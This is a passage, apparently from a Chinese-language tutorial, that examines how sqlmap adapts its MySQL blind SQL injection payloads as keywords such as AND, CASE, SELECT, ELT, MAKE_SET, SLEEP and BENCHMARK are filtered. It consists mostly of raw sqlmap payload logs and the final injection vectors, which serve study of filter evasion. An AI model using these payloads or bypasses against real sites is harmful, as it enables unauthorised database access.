+    [23:03:58] [PAYLOAD] (CASE WHEN (63=63) THEN SLEEP(5) ELSE 5683 END)
+    [23:04:03] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:04:03] [PAYLOAD] (CASE WHEN (90 63) THEN SLEEP(5) ELSE 1858 END)
+    [23:04:03] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:04:03] [DEBUG] checking for parameter length constrainting mechanisms
+    [23:04:03] [PAYLOAD] (CASE WHEN (5036=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                5036) THEN SLEEP(5) ELSE 3974 END)
+    [23:04:08] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:04:08] [DEBUG] checking for filtered characters
+    [23:04:08] [PAYLOAD] (CASE WHEN (6800>6799) THEN SLEEP(5) ELSE 4861 END)
+    [23:04:13] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+    [23:04:13] [DEBUG] used the default behaviour, running in batch mode
+    sqlmap identified the following injection point(s) with a total of 1052 HTTP(s) requests:
+    ---    Parameter: id (GET)
+        Type: AND/OR time-based blind
+        Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+        Payload: id=(CASE WHEN (6409=6409) THEN SLEEP(5) ELSE 6409 END)
+        Vector: (CASE WHEN ([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM] END)
+    ---    [23:04:13] [INFO] the back-end DBMS is MySQL
+    back-end DBMS: MySQL >= 5.0.12
+    
+
+**  
+  
+**
+
+**假如禁掉的是AND,OR，RLIKE,CASE字符串，就会直接使用select进行查询，不适用and，or**
+
+**![image.png](https://image.3001.net/images/20191227/1577459277_5e061e4d22c26.png!small)  
+**
+
+ **假如禁掉的是AND,OR，RLIKE,CASE，SELECT字符串**
+
+    
+    
+    ELT(N,str1,str2,str3,...)
+    如果N =1返回str1，如果N= 2返回str2，等等。返回NULL如果参数的数量小于1或大于N。ELT()是FIELD()的补集。
+    
+    
+    
+    [23:08:59] [INFO] checking if the injection point on GET parameter 'id' is a false positive
+    [23:08:59] [PAYLOAD] ELT(24=24,SLEEP(5))
+    [23:09:04] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:04] [PAYLOAD] ELT(24=44,SLEEP(5))
+    [23:09:04] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:04] [PAYLOAD] ELT(24=65,SLEEP(5))
+    [23:09:04] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:05] [PAYLOAD] ELT(65=44,SLEEP(5))
+    [23:09:05] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:05] [PAYLOAD] ELT(44=44,SLEEP(5))
+    [23:09:10] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:10] [PAYLOAD] ELT(65 44,SLEEP(5))
+    [23:09:10] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:10] [PAYLOAD] ELT(33=33,SLEEP(5))
+    [23:09:15] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:15] [PAYLOAD] ELT(33=59,SLEEP(5))
+    [23:09:15] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:15] [PAYLOAD] ELT(33=77,SLEEP(5))
+    [23:09:15] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:15] [PAYLOAD] ELT(77=59,SLEEP(5))
+    [23:09:15] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:15] [PAYLOAD] ELT(59=59,SLEEP(5))
+    [23:09:20] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:20] [PAYLOAD] ELT(77 59,SLEEP(5))
+    [23:09:20] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:20] [PAYLOAD] ELT(18=18,SLEEP(5))
+    [23:09:25] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:25] [PAYLOAD] ELT(18=49,SLEEP(5))
+    [23:09:25] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:25] [PAYLOAD] ELT(18=57,SLEEP(5))
+    [23:09:25] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:25] [PAYLOAD] ELT(57=49,SLEEP(5))
+    [23:09:25] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:25] [PAYLOAD] ELT(49=49,SLEEP(5))
+    [23:09:30] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:30] [PAYLOAD] ELT(57 49,SLEEP(5))
+    [23:09:31] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:31] [PAYLOAD] ELT(30=30,SLEEP(5))
+    [23:09:36] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:36] [PAYLOAD] ELT(30=34,SLEEP(5))
+    [23:09:36] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:36] [PAYLOAD] ELT(30=71,SLEEP(5))
+    [23:09:36] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:36] [PAYLOAD] ELT(71=34,SLEEP(5))
+    [23:09:36] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:36] [PAYLOAD] ELT(34=34,SLEEP(5))
+    [23:09:41] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:41] [PAYLOAD] ELT(71 34,SLEEP(5))
+    [23:09:41] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:41] [PAYLOAD] ELT(19=19,SLEEP(5))
+    [23:09:46] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:46] [PAYLOAD] ELT(19=30,SLEEP(5))
+    [23:09:46] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:46] [PAYLOAD] ELT(19=55,SLEEP(5))
+    [23:09:46] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:46] [PAYLOAD] ELT(55=30,SLEEP(5))
+    [23:09:46] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:46] [PAYLOAD] ELT(30=30,SLEEP(5))
+    [23:09:51] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:51] [PAYLOAD] ELT(55 30,SLEEP(5))
+    [23:09:51] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:51] [DEBUG] checking for parameter length constrainting mechanisms
+    [23:09:51] [PAYLOAD] ELT(9111=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                9111,SLEEP(5))
+    [23:09:56] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:09:56] [DEBUG] checking for filtered characters
+    [23:09:56] [PAYLOAD] ELT(9294>9293,SLEEP(5))
+    [23:10:01] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+    [23:10:02] [DEBUG] used the default behaviour, running in batch mode
+    sqlmap identified the following injection point(s) with a total of 1056 HTTP(s) requests:
+    ---    Parameter: id (GET)
+        Type: AND/OR time-based blind
+        Title: MySQL time-based blind - Parameter replace (ELT)
+        Payload: id=ELT(1874=1874,SLEEP(5))
+        Vector: ELT([INFERENCE],SLEEP([SLEEPTIME]))
+    ---    
+
+**假如禁掉的是AND,OR，RLIKE,CASE，SELECT，ELT字符串**
+
+    
+    
+    MAKE_SET(bits,str1,str2,…)
+    返回一个设定值(含子字符串分隔字符串","字符)，在设置位的相应位的字符串。str1对应于位0，str2到第1位，依此类推。在str1，str1有NULL值，…那么不添加到结果
+    
+    
+    
+    [23:13:17] [INFO] checking if the injection point on GET parameter 'id' is a false positive
+    [23:13:17] [PAYLOAD] MAKE_SET(54=54,SLEEP(5))
+    [23:13:22] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:13:22] [PAYLOAD] MAKE_SET(54=83,SLEEP(5))
+    [23:13:22] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:13:22] [PAYLOAD] MAKE_SET(54=97,SLEEP(5))
+    [23:13:22] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:13:22] [PAYLOAD] MAKE_SET(97=83,SLEEP(5))
+    [23:13:22] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:13:22] [PAYLOAD] MAKE_SET(83=83,SLEEP(5))
+    [23:13:27] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:13:27] [PAYLOAD] MAKE_SET(97 83,SLEEP(5))
+    [23:13:27] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:13:28] [PAYLOAD] MAKE_SET(23=23,SLEEP(5))
+    [23:13:33] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:13:33] [PAYLOAD] MAKE_SET(23=39,SLEEP(5))
+    [23:13:33] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:13:33] [PAYLOAD] MAKE_SET(23=50,SLEEP(5))
+    [23:13:33] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:13:33] [PAYLOAD] MAKE_SET(50=39,SLEEP(5))
+    [23:13:33] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:13:33] [PAYLOAD] MAKE_SET(39=39,SLEEP(5))
+    [23:13:38] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:13:38] [PAYLOAD] MAKE_SET(50 39,SLEEP(5))
+    [23:13:38] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:13:38] [PAYLOAD] MAKE_SET(24=24,SLEEP(5))
+    [23:13:43] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:13:43] [PAYLOAD] MAKE_SET(24=69,SLEEP(5))
+    [23:13:43] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:13:43] [PAYLOAD] MAKE_SET(24=95,SLEEP(5))
+    [23:13:43] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:13:43] [PAYLOAD] MAKE_SET(95=69,SLEEP(5))
+    [23:13:43] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:13:43] [PAYLOAD] MAKE_SET(69=69,SLEEP(5))
+    [23:13:48] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:13:48] [PAYLOAD] MAKE_SET(95 69,SLEEP(5))
+    [23:13:48] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:13:48] [PAYLOAD] MAKE_SET(38=38,SLEEP(5))
+    [23:13:53] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:13:53] [PAYLOAD] MAKE_SET(38=64,SLEEP(5))
+    [23:13:53] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:13:53] [PAYLOAD] MAKE_SET(38=88,SLEEP(5))
+    [23:13:54] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:13:54] [PAYLOAD] MAKE_SET(88=64,SLEEP(5))
+    [23:13:54] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:13:54] [PAYLOAD] MAKE_SET(64=64,SLEEP(5))
+    [23:13:59] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:13:59] [PAYLOAD] MAKE_SET(88 64,SLEEP(5))
+    [23:13:59] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:13:59] [PAYLOAD] MAKE_SET(90=90,SLEEP(5))
+    [23:14:04] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:14:04] [PAYLOAD] MAKE_SET(90=92,SLEEP(5))
+    [23:14:04] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:14:04] [PAYLOAD] MAKE_SET(90=96,SLEEP(5))
+    [23:14:04] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:14:04] [PAYLOAD] MAKE_SET(96=92,SLEEP(5))
+    [23:14:04] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:14:04] [PAYLOAD] MAKE_SET(92=92,SLEEP(5))
+    [23:14:09] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:14:09] [PAYLOAD] MAKE_SET(96 92,SLEEP(5))
+    [23:14:09] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:14:09] [DEBUG] checking for parameter length constrainting mechanisms
+    [23:14:09] [PAYLOAD] MAKE_SET(4328=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                4328,SLEEP(5))
+    [23:14:14] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:14:14] [DEBUG] checking for filtered characters
+    [23:14:14] [PAYLOAD] MAKE_SET(2779>2778,SLEEP(5))
+    [23:14:19] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+    [23:14:19] [DEBUG] used the default behaviour, running in batch mode
+    sqlmap identified the following injection point(s) with a total of 1057 HTTP(s) requests:
+    ---    Parameter: id (GET)
+        Type: AND/OR time-based blind
+        Title: MySQL time-based blind - Parameter replace (MAKE_SET)
+        Payload: id=MAKE_SET(3840=3840,SLEEP(5))
+        Vector: MAKE_SET([INFERENCE],SLEEP([SLEEPTIME]))
+    ---
+ **假如禁掉的是AND,OR，RLIKE,CASE，SELECT，ELT，MAKE_SET字符串，就会报错**
+
+**![image.png](https://image.3001.net/images/20191227/1577459839_5e06207fb17ff.png!small)让我们回归到初始，禁止SLEEP字符串**
+
+    
+    
+    BENCHMARK(count,expr) 函数重复count次执行表达式expr，它可以用于计时MySQL处理表达式有多快，结果值总是0。
+    
+    
+    
+    [23:31:34] [INFO] checking if the injection point on GET parameter 'id' is a false positive
+    [23:31:34] [PAYLOAD] 1 AND 8586=IF((62=62),BENCHMARK(5000000,MD5(0x49787364)),8586)
+    [23:31:35] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:31:35] [PAYLOAD] 1 AND 3175=IF((62=86),BENCHMARK(5000000,MD5(0x616f6b74)),3175)
+    [23:31:35] [PAYLOAD] 1 AND 1368=IF((62=98),BENCHMARK(5000000,MD5(0x66457065)),1368)
+    [23:31:35] [PAYLOAD] 1 AND 2362=IF((98=86),BENCHMARK(5000000,MD5(0x4e6f5a6a)),2362)
+    [23:31:35] [PAYLOAD] 1 AND 5234=IF((86=86),BENCHMARK(5000000,MD5(0x6d4e6d49)),5234)
+    [23:31:36] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:31:36] [PAYLOAD] 1 AND 5792=IF((98 86),BENCHMARK(5000000,MD5(0x75735371)),5792)
+    [23:31:36] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:31:36] [PAYLOAD] 1 AND 7985=IF((14=14),BENCHMARK(5000000,MD5(0x78417065)),7985)
+    [23:31:37] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:31:37] [PAYLOAD] 1 AND 5476=IF((14=53),BENCHMARK(5000000,MD5(0x7267436f)),5476)
+    [23:31:37] [PAYLOAD] 1 AND 2433=IF((14=76),BENCHMARK(5000000,MD5(0x52756b6f)),2433)
+    [23:31:37] [PAYLOAD] 1 AND 2054=IF((76=53),BENCHMARK(5000000,MD5(0x6c4c6e66)),2054)
+    [23:31:37] [PAYLOAD] 1 AND 6832=IF((53=53),BENCHMARK(5000000,MD5(0x6e507a50)),6832)
+    [23:31:38] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:31:38] [PAYLOAD] 1 AND 4267=IF((76 53),BENCHMARK(5000000,MD5(0x6a766347)),4267)
+    [23:31:38] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:31:38] [PAYLOAD] 1 AND 6289=IF((22=22),BENCHMARK(5000000,MD5(0x5258624a)),6289)
+    [23:31:39] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:31:39] [PAYLOAD] 1 AND 7746=IF((22=62),BENCHMARK(5000000,MD5(0x4f597465)),7746)
+    [23:31:39] [PAYLOAD] 1 AND 1055=IF((22=64),BENCHMARK(5000000,MD5(0x4f485952)),1055)
+    [23:31:39] [PAYLOAD] 1 AND 7423=IF((64=62),BENCHMARK(5000000,MD5(0x6d64586e)),7423)
+    [23:31:39] [PAYLOAD] 1 AND 1586=IF((62=62),BENCHMARK(5000000,MD5(0x71696243)),1586)
+    [23:31:40] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:31:40] [PAYLOAD] 1 AND 9110=IF((64 62),BENCHMARK(5000000,MD5(0x4f7a5241)),9110)
+    [23:31:40] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:31:40] [PAYLOAD] 1 AND 4776=IF((12=12),BENCHMARK(5000000,MD5(0x596c7457)),4776)
+    [23:31:40] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:31:40] [PAYLOAD] 1 AND 8424=IF((12=22),BENCHMARK(5000000,MD5(0x457a486e)),8424)
+    [23:31:40] [PAYLOAD] 1 AND 2962=IF((12=32),BENCHMARK(5000000,MD5(0x6d567677)),2962)
+    [23:31:40] [PAYLOAD] 1 AND 7592=IF((32=22),BENCHMARK(5000000,MD5(0x6e4b6746)),7592)
+    [23:31:41] [PAYLOAD] 1 AND 2975=IF((22=22),BENCHMARK(5000000,MD5(0x416a6f6a)),2975)
+    [23:31:41] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:31:41] [PAYLOAD] 1 AND 2138=IF((32 22),BENCHMARK(5000000,MD5(0x7342766c)),2138)
+    [23:31:42] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:31:42] [PAYLOAD] 1 AND 9458=IF((47=47),BENCHMARK(5000000,MD5(0x4458447a)),9458)
+    [23:31:43] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:31:43] [PAYLOAD] 1 AND 8078=IF((47=48),BENCHMARK(5000000,MD5(0x4652454b)),8078)
+    [23:31:43] [PAYLOAD] 1 AND 5384=IF((47=76),BENCHMARK(5000000,MD5(0x4f6d706e)),5384)
+    [23:31:43] [PAYLOAD] 1 AND 9112=IF((76=48),BENCHMARK(5000000,MD5(0x764f626b)),9112)
+    [23:31:43] [PAYLOAD] 1 AND 9116=IF((48=48),BENCHMARK(5000000,MD5(0x6873764a)),9116)
+    [23:31:44] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:31:44] [PAYLOAD] 1 AND 2917=IF((76 48),BENCHMARK(5000000,MD5(0x557a6c62)),2917)
+    [23:31:44] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:31:44] [DEBUG] checking for parameter length constrainting mechanisms
+    [23:31:44] [PAYLOAD] 1 AND 2065=IF((9201=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                9201),BENCHMARK(5000000,MD5(0x57724358)),2065)
+    [23:31:45] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:31:45] [DEBUG] checking for filtered characters
+    [23:31:45] [PAYLOAD] 1 AND 1617=IF((3411>3410),BENCHMARK(5000000,MD5(0x56496575)),1617)
+    [23:31:45] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+    [23:31:45] [DEBUG] used the default behaviour, running in batch mode
+    sqlmap identified the following injection point(s) with a total of 437 HTTP(s) requests:
+    ---    Parameter: id (GET)
+        Type: AND/OR time-based blind
+        Title: MySQL <= 5.0.11 AND time-based blind (heavy query)
+        Payload: id=1 AND 4803=BENCHMARK(5000000,MD5(0x44487655))
+        Vector: AND [RANDNUM]=IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])
+    ---
+ **当我禁止SLEEP,BENCHMARK,就会失败，说明基于时间注入就是这两个函数之一控制的**
+
+**![image.png](https://image.3001.net/images/20191227/1577460925_5e0624bd17332.png!small)**
+
+#  **基于布尔型注入（B）**
+
+ **默认情况，由AND进行判断结果是否相等**
+
+    
+    
+    [23:38:26] [INFO] checking if the injection point on GET parameter 'id' is a false positive
+    [23:38:26] [PAYLOAD] 1 AND 33=33
+    [23:38:26] [PAYLOAD] 1 AND 33=96
+    [23:38:26] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:38:26] [PAYLOAD] 1 AND 96=76
+    [23:38:26] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:38:26] [PAYLOAD] 1 AND 76=76
+    [23:38:26] [PAYLOAD] 1 AND 96 76
+    [23:38:26] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:38:26] [PAYLOAD] 1 AND 70=70
+    [23:38:26] [PAYLOAD] 1 AND 70=96
+    [23:38:26] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:38:26] [PAYLOAD] 1 AND 96=81
+    [23:38:26] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:38:26] [PAYLOAD] 1 AND 81=81
+    [23:38:26] [PAYLOAD] 1 AND 96 81
+    [23:38:26] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:38:26] [PAYLOAD] 1 AND 33=33
+    [23:38:26] [PAYLOAD] 1 AND 33=67
+    [23:38:27] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:38:27] [PAYLOAD] 1 AND 67=52
+    [23:38:27] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:38:27] [PAYLOAD] 1 AND 52=52
+    [23:38:27] [PAYLOAD] 1 AND 67 52
+    [23:38:27] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:38:27] [PAYLOAD] 1 AND 16=16
+    [23:38:27] [PAYLOAD] 1 AND 16=96
+    [23:38:27] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:38:27] [PAYLOAD] 1 AND 96=64
+    [23:38:27] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:38:27] [PAYLOAD] 1 AND 64=64
+    [23:38:27] [PAYLOAD] 1 AND 96 64
+    [23:38:27] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:38:27] [PAYLOAD] 1 AND 38=38
+    [23:38:27] [PAYLOAD] 1 AND 38=71
+    [23:38:27] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:38:27] [PAYLOAD] 1 AND 71=57
+    [23:38:27] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:38:27] [PAYLOAD] 1 AND 57=57
+    [23:38:27] [PAYLOAD] 1 AND 71 57
+    [23:38:27] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:38:27] [DEBUG] checking for parameter length constrainting mechanisms
+    [23:38:27] [PAYLOAD] 1 AND 9527=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                9527
+    [23:38:27] [DEBUG] checking for filtered characters
+    [23:38:27] [PAYLOAD] 1 AND (1709)=1709
+    [23:38:27] [PAYLOAD] 1 AND 1710>1709
+    GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+    [23:38:27] [DEBUG] used the default behaviour, running in batch mode
+    sqlmap identified the following injection point(s) with a total of 39 HTTP(s) requests:
+    ---    Parameter: id (GET)
+        Type: boolean-based blind
+        Title: AND boolean-based blind - WHERE or HAVING clause
+        Payload: id=1 AND 4833=4833
+        Vector: AND [INFERENCE]
+    ---
+ **禁掉AND**
+
+就会使用case when then语句进行查询
+
+    
+    
+    [23:41:16] [INFO] checking if the injection point on GET parameter 'id' is a false positive
+    [23:41:16] [PAYLOAD] (CASE WHEN (21=21) THEN 1 ELSE 5844*(SELECT 5844 FROM DUAL UNION SELECT 7325 FROM DUAL) END)
+    [23:41:16] [PAYLOAD] (CASE WHEN (21=64) THEN 1 ELSE 9219*(SELECT 9219 FROM DUAL UNION SELECT 1744 FROM DUAL) END)
+    [23:41:16] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:41:17] [PAYLOAD] (CASE WHEN (64=59) THEN 1 ELSE 8110*(SELECT 8110 FROM DUAL UNION SELECT 2379 FROM DUAL) END)
+    [23:41:17] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:41:17] [PAYLOAD] (CASE WHEN (59=59) THEN 1 ELSE 7130*(SELECT 7130 FROM DUAL UNION SELECT 4552 FROM DUAL) END)
+    [23:41:17] [PAYLOAD] (CASE WHEN (64 59) THEN 1 ELSE 3780*(SELECT 3780 FROM DUAL UNION SELECT 9899 FROM DUAL) END)
+    [23:41:17] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:41:17] [PAYLOAD] (CASE WHEN (60=60) THEN 1 ELSE 9062*(SELECT 9062 FROM DUAL UNION SELECT 4510 FROM DUAL) END)
+    [23:41:17] [PAYLOAD] (CASE WHEN (60=94) THEN 1 ELSE 5004*(SELECT 5004 FROM DUAL UNION SELECT 2949 FROM DUAL) END)
+    [23:41:17] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:41:17] [PAYLOAD] (CASE WHEN (94=82) THEN 1 ELSE 1182*(SELECT 1182 FROM DUAL UNION SELECT 7567 FROM DUAL) END)
+    [23:41:17] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:41:17] [PAYLOAD] (CASE WHEN (82=82) THEN 1 ELSE 8876*(SELECT 8876 FROM DUAL UNION SELECT 5433 FROM DUAL) END)
+    [23:41:17] [PAYLOAD] (CASE WHEN (94 82) THEN 1 ELSE 5776*(SELECT 5776 FROM DUAL UNION SELECT 9763 FROM DUAL) END)
+    [23:41:17] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:41:17] [PAYLOAD] (CASE WHEN (34=34) THEN 1 ELSE 4935*(SELECT 4935 FROM DUAL UNION SELECT 5480 FROM DUAL) END)
+    [23:41:17] [PAYLOAD] (CASE WHEN (34=82) THEN 1 ELSE 3865*(SELECT 3865 FROM DUAL UNION SELECT 1281 FROM DUAL) END)
+    [23:41:17] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:41:17] [PAYLOAD] (CASE WHEN (82=36) THEN 1 ELSE 8529*(SELECT 8529 FROM DUAL UNION SELECT 9064 FROM DUAL) END)
+    [23:41:17] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:41:17] [PAYLOAD] (CASE WHEN (36=36) THEN 1 ELSE 3222*(SELECT 3222 FROM DUAL UNION SELECT 9853 FROM DUAL) END)
+    [23:41:17] [PAYLOAD] (CASE WHEN (82 36) THEN 1 ELSE 5873*(SELECT 5873 FROM DUAL UNION SELECT 6193 FROM DUAL) END)
+    [23:41:18] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:41:18] [PAYLOAD] (CASE WHEN (14=14) THEN 1 ELSE 4089*(SELECT 4089 FROM DUAL UNION SELECT 2387 FROM DUAL) END)
+    [23:41:18] [PAYLOAD] (CASE WHEN (14=40) THEN 1 ELSE 8087*(SELECT 8087 FROM DUAL UNION SELECT 6170 FROM DUAL) END)
+    [23:41:18] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:41:18] [PAYLOAD] (CASE WHEN (40=37) THEN 1 ELSE 5070*(SELECT 5070 FROM DUAL UNION SELECT 7441 FROM DUAL) END)
+    [23:41:18] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:41:18] [PAYLOAD] (CASE WHEN (37=37) THEN 1 ELSE 2768*(SELECT 2768 FROM DUAL UNION SELECT 7753 FROM DUAL) END)
+    [23:41:18] [PAYLOAD] (CASE WHEN (40 37) THEN 1 ELSE 1946*(SELECT 1946 FROM DUAL UNION SELECT 9529 FROM DUAL) END)
+    [23:41:18] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:41:18] [PAYLOAD] (CASE WHEN (31=31) THEN 1 ELSE 5197*(SELECT 5197 FROM DUAL UNION SELECT 2014 FROM DUAL) END)
+    [23:41:18] [PAYLOAD] (CASE WHEN (31=75) THEN 1 ELSE 9154*(SELECT 9154 FROM DUAL UNION SELECT 4722 FROM DUAL) END)
+    [23:41:18] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:41:18] [PAYLOAD] (CASE WHEN (75=48) THEN 1 ELSE 9742*(SELECT 9742 FROM DUAL UNION SELECT 5455 FROM DUAL) END)
+    [23:41:18] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:41:18] [PAYLOAD] (CASE WHEN (48=48) THEN 1 ELSE 7816*(SELECT 7816 FROM DUAL UNION SELECT 2905 FROM DUAL) END)
+    [23:41:18] [PAYLOAD] (CASE WHEN (75 48) THEN 1 ELSE 1589*(SELECT 1589 FROM DUAL UNION SELECT 7267 FROM DUAL) END)
+    [23:41:18] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [23:41:18] [DEBUG] checking for parameter length constrainting mechanisms
+    [23:41:18] [PAYLOAD] (CASE WHEN (9454=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                9454) THEN 1 ELSE 6518*(SELECT 6518 FROM DUAL UNION SELECT 2474 FROM DUAL) END)
+    [23:41:18] [DEBUG] checking for filtered characters
+    [23:41:18] [PAYLOAD] (CASE WHEN ((1557)=1557) THEN 1 ELSE 9993*(SELECT 9993 FROM DUAL UNION SELECT 7747 FROM DUAL) END)
+    [23:41:18] [PAYLOAD] (CASE WHEN (1558>1557) THEN 1 ELSE 8687*(SELECT 8687 FROM DUAL UNION SELECT 8396 FROM DUAL) END)
+    GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+    [23:41:18] [DEBUG] used the default behaviour, running in batch mode
+    sqlmap identified the following injection point(s) with a total of 655 HTTP(s) requests:
+    ---    Parameter: id (GET)
+        Type: boolean-based blind
+        Title: Boolean-based blind - Parameter replace (DUAL) (original value)
